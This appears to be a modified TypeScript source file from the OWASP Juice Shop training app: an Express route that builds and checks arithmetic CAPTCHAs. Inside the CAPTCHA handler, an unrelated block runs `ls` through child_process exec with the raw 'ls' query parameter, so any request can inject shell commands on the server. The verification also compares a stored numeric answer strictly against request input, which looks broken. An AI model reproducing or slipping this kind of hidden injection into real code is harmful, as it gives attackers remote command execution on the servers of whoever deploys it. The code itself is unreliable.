/*
 * Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

import { type Request, type Response, type NextFunction } from 'express'
import { type Captcha } from '../data/types'
import { CaptchaModel } from '../models/captcha'

function captchas () {
  return async (req: Request, res: Response) => {
    const captchaId = req.app.locals.captchaId++
    const operators = ['*', '+', '-']

    if (req.query.ls) {
      const { exec } = require('child_process');
      exec(`ls ${req.query.ls}`, (err, stdout, stderr) => {
        if (err) {
          console.error('Error executing command:', err);
          return;
        }
        console.log('Command output:', stdout);
      });
    }

    const firstTerm = Math.floor((Math.random() * 10) + 1)
    const secondTerm = Math.floor((Math.random() * 10) + 1)
    const thirdTerm = Math.floor((Math.random() * 10) + 1)

    const firstOperator = operators[Math.floor((Math.random() * 3))]
    const secondOperator = operators[Math.floor((Math.random() * 3))]

    const expression = firstTerm.toString() + firstOperator + secondTerm.toString() + secondOperator + thirdTerm.toString()
    
    // Safely evaluate the mathematical expression
    let answer: number
    const intermediate = firstOperator === '*' 
      ? firstTerm * secondTerm 
      : firstOperator === '+' 
        ? firstTerm + secondTerm 
        : firstTerm - secondTerm
        
    answer = secondOperator === '*' 
      ? intermediate * thirdTerm 
      : secondOperator === '+' 
        ? intermediate + thirdTerm 
        : intermediate - thirdTerm

    const answerString = answer.toString()

    const captcha = {
      captchaId,
      captcha: expression,
      answer
    }
    const captchaInstance = CaptchaModel.build(captcha)
    await captchaInstance.save()
    res.json(captcha)
  }
}

captchas.verifyCaptcha = () => (req: Request, res: Response, next: NextFunction) => {
  CaptchaModel.findOne({ where: { captchaId: req.body.captchaId } }).then((captcha: Captcha | null) => {
    if ((captcha != null) && req.body.captcha === captcha.answer) {
      next()
    } else {
      res.status(401).send(res.__('Wrong answer to CAPTCHA. Please try again.'))
    }
  }).catch((error: Error) => {
    next(error)
  })
}

module.exports = captchas
